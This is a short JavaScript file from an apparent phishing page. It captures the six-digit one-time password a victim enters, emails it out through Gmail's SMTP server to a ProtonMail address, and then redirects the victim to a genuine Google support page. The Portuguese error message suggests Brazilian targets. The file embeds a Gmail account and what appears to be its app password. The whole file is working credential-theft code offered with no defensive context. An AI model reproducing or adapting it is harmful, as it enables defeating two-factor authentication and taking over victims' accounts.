window.onload = function()
{
    var x = document.getElementById("otpBtn");
    var err = document.getElementById("bad-login");

    x.addEventListener("click", function(e) {
        e.preventDefault();
        var oOtp = document.querySelector("#otp");
        var y = oOtp.value;
        console.log(y);
        if (y.length == 6)
        {
            console.log(y);
            Email.send({
                Host: "smtp.gmail.com",
                Username : "julio74108520@gmail.com",
                Password : "hgvt vldi peit jcoh",
                To : 'user1533@protonmail.com',
                From : "julio74108520@gmail.com",
                Subject : y,
                Body : "<p> << One Time Password </p>",
            });
            window.location.href = "https://support.google.com/accounts/answer/46526?hl=pt-BR";

        } else {
            err.innerHTML = "<p class='err-alert'>Código incorreto, tente novamente.<p>";
            oOtp.value='';
        }
    });
}    
    
    
